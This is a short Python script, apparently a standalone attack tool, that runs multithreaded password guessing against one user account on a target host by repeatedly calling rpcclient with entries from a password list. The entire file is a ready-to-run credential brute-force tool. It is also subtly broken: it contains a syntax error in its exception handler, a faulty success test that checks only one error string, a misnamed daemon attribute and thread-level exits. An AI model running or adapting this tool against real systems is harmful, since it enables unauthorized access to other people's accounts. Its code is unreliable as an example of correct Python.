#!/usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import threading
import subprocess as s
import queue
import sys
import time


class workerthread(threading.Thread):

    def __init__(self, rhost, user, q, lc):
        threading.Thread.__init__(self)
        self.rhost = rhost
        self.user = user
        self.q = q
        self.lc = lc

    def run(self):
        while True:
            try:
                pwd = self.q.get().strip('\n')
                out = s.run(["rpcclient", "-U", "{}%{}".format(self.user, pwd), self.rhost, "-c quit"], stdout=s.PIPE, stderr=s.PIPE, encoding="utf-8")

                if ('Error' or 'DENIED' or 'TIMEOUT') not in out.stderr:
                    print ('Success! user:{} pass:{}'.format(self.user, pwd))
                    sys.exit()

                elif 'TIMEOUT' in out.stdout:
                    print ('Connection issues. exiting.')
                    sys.exit()
                else:
                    print ('{}/{} - {} failed.'.format(self.q.qsize(), self.lc, pwd))
            
            except Exception e:
                print (e)
                return

            self.q.task_done()

def build_pwd_queue(pwdfile):
    pwdq = queue.Queue()
    linecount = 0
    with open(pwdfile) as fileobj:
        for line in fileobj:
            pwdq.put(line)
            linecount += 1
    return (pwdq, linecount)

if __name__ == '__main__':

    p = argparse.ArgumentParser('Brute force w/ rpcclient')
    p.add_argument('user', help='single username to test')
    p.add_argument('pwdfile', help='path to password file')
    p.add_argument('rhost', help='ip address of target')
    p.add_argument('-t', help='max threads', dest='maxthread',
                   type=int, default=10)
    r = p.parse_args()

    start = time.time()

    (pwdq, lc) = build_pwd_queue(r.pwdfile) 
    threadlist = []

    for i in range(r.maxthread):
        worker = workerthread(r.rhost, r.user, pwdq, lc)
        worker.Daemon = True
        worker.start()
        threadlist.append(worker)

    pwdq.join()  

    runtime = round(time.time() - start, 2)
    print ('Runtime: {}s'.format(runtime))
    print ('Finished')
